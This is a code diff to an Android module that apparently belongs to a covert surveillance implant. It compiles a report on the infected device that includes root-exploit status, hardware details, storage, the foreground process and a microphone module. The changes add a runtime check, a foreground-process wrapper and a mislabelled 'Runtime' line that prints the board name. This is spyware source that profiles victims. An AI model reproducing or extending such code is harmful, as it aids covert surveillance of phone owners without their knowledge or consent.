@@ -18,6 +18,7 @@ import android.os.Environment;
 import android.os.StatFs;
 
 import com.android.dvci.Device;
+import com.android.dvci.Root;
 import com.android.dvci.RunningProcesses;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
@@ -190,6 +191,8 @@ public class ModuleDevice extends BaseInstantModule {
 		sb.append("\n" + M.e("-- SYSTEM --") + "\n"); //$NON-NLS-1$
 
 		sb.append(M.e("Root Status: ") + Status.getExploitStatusString() + M.e(", Result: ") + Status.getExploitResultString() + "\n");
+		sb.append(M.e("OS Runtime: ") + (Root.isArtInUse()?M.e("ART"):M.e("Dalvik"))+ "\n");
+		sb.append(M.e("Runtime: ") + Build.BOARD + "\n");
 		sb.append(M.e("Board: ") + Build.BOARD + "\n");
 		sb.append(M.e("Brand: ") + Build.BRAND + "\n");
 		sb.append(M.e("Device: ") + Build.DEVICE + "\n");
@@ -219,7 +222,7 @@ public class ModuleDevice extends BaseInstantModule {
 		sb.append(M.e("External space: ") + bytesAvailableExt + "\n");
 
 		RunningProcesses runningProcesses = RunningProcesses.self();
-		sb.append(M.e("Foreground process: ") + runningProcesses.getForeground() + "\n"); //$NON-NLS-1$
+		sb.append(M.e("Foreground process: ") + runningProcesses.getForeground_wrapper() + "\n"); //$NON-NLS-1$
 
 		ModuleMic mic = ModuleMic.self();
 		if (mic != null) {
